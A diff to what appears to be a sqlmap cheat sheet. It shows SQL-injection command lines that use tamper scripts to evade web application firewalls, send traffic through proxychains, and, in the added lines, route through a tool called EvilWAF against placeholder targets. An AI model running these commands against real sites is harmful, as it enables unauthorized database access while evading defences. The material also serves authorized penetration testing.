@@ -39,3 +39,6 @@ $ sqlmap -u "https://example.com/login?id=1" --tamper=space2comment,between --pr
 
 Example use SQLMap + ProxyChains :
 $ proxychains sqlmap -u 'https://example.com/' --dbs --batch -p id --random-agent --tamper=between,space2comment --dbms mysql --tech=B --no-cast  --flush-session --threads 10
+
+Example with tools EvilWAF(https://github.com/matrixleons/evilwaf) is running, point any tool to it via proxy:
+$ sqlmap -u "https://target.com/page?id=1" --proxy=http://127.0.0.1:8080 --ignore-proxy=False
